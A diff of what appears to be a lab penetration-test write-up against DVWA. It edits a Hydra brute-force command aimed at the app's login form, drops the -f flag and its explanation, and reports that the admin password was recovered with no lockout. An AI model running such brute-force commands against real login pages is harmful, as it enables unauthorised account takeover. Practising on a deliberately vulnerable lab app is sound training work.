@@ -62,11 +62,10 @@ python3 sql_injection_demo.py
 **Command:**
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.2 \
-  http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low" \
-  -t 4 -V -f
+  http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=<YOUR_PHPSESSID>;security=low:F=Username and/or password incorrect."
 ```
 
-**Note:** A valid session cookie (`PHPSESSID`) is required to access the authenticated vulnerability page. The `-f` flag stops Hydra immediately upon finding the first valid credential.
+**Note:** A valid session cookie (`PHPSESSID`) is required to access the authenticated vulnerability page.
 
 **Result:** Valid admin credential recovered — `password` — found at attempt 4 of 14,344,399. No rate limiting or account lockout was triggered. The server accepted all attempts without restriction.
 
